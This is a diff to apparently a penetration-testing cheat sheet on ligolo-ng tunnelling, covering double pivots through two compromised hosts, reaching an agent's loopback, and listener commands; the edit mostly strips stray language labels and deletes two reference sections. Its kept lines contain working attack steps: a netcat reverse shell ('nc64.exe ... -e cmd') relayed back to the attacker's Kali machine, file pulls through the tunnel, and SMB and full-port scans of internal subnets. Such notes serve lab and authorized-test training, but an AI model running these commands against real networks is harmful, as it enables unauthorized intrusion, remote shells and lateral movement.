@@ -120,8 +120,6 @@ Confirms the route/tunnel works by sweeping SMB across the newly reachable subne
 
 **1. Run the agent on Target 2, connecting to Target 1's internal IP (not Kali directly)**
 
-powershell
-
 ```powershell
 .\agent.exe -connect 172.16.5.10:11601 -ignore-cert
 ```
@@ -135,11 +133,9 @@ ligolo-ng » session
 [Agent : Target2] » autoroute
 ```
 
-Select the Target 2 subnet (e.g. `172.16.6.0/24`). This creates a _second_ TUN interface (`tunnel2`), adds the route, and starts Layer 2 — automatically stacked on top of Layer 1.
+Select the Target 2 subnet (e.g. `172.16.6.0/24`). This creates a second TUN interface (`tunnel2`), adds the route, and starts Layer 2, automatically stacked on top of Layer 1.
 
 **Manual fallback:**
-
-bash
 
 ```bash
 sudo ip tuntap add user $(whoami) mode tun tunnel2
@@ -158,11 +154,10 @@ listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
 listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
 ```
 
-Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the matching local port on Kali — useful for catching callbacks or serving files, since 80/443 are often allowed through firewalls/AV.
+Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the matching local port on Kali, useful for catching callbacks or serving files, since 80/443 are often allowed through firewalls/AV.
 
 **4. Pull a file from Kali through Target 1's internal IP**
 
-powershell
 
 ```powershell
 wget http://172.16.5.10/file -outfile file
@@ -172,7 +167,6 @@ Target 2 requests the file from Target 1's internal IP; the listener on `tunnel1
 
 **5. Catch a reverse shell from Target 2**
 
-powershell
 
 ```powershell
 nc64.exe 172.16.5.10 443 -e cmd
@@ -181,8 +175,6 @@ nc64.exe 172.16.5.10 443 -e cmd
 Target 2 calls back to Target 1's internal IP on a whitelisted port; the listener relays it to the local `nc` listener on Kali.
 
 **6. Verify reachability on the second subnet**
-
-bash
 
 ```bash
 netexec smb 172.16.6.0/24
@@ -198,8 +190,6 @@ Used when only one internal-only service/port on the agent's own loopback (e.g. 
 
 **1. Connect the agent to the proxy**
 
-powershell
-
 ```powershell
 .\agent.exe -connect 10.10.14.14:11601 -ignore-cert
 ```
@@ -207,8 +197,6 @@ powershell
 **2. Create the interface and route**
 
 Either let `autoroute` handle it, or do it manually:
-
-bash
 
 ```bash
 sudo ip tuntap add user $(whoami) mode tun ligolo
@@ -224,32 +212,6 @@ start --tun ligolo
 
 **3. Verify with Nmap**
 
-bash
-
 ```bash
 nmap -p- 240.0.0.1
-```
-
----
-
-## Listener management (v0.8+)
-
-```
-listener_list                                       # list all active listeners/relays
-listener_stop --id <id>                             # tear down a specific listener
-listener_add --addr 0.0.0.0:1080 --to 127.0.0.1 --socks5   # stand up a SOCKS5 listener instead of a plain TCP/UDP relay
-listener_add --addr 0.0.0.0:53 --to 127.0.0.1:53 --udp     # explicit UDP relay (default is TCP)
-```
-
----
-
-## Other useful console commands (v0.8+)
-
-```
-session              # list/select agent sessions
-autoroute            # auto-discover + create interface/route/tunnel for the selected session
-ifconfig             # show the selected agent's network interfaces (handy before deciding what to route)
-interface_create --name ligolo   # create a TUN interface from inside the console, instead of ip tuntap
-tunnel_list          # show active tunnels and which session/interface they're bound to
-kill                 # remotely terminate the selected agent
 ```
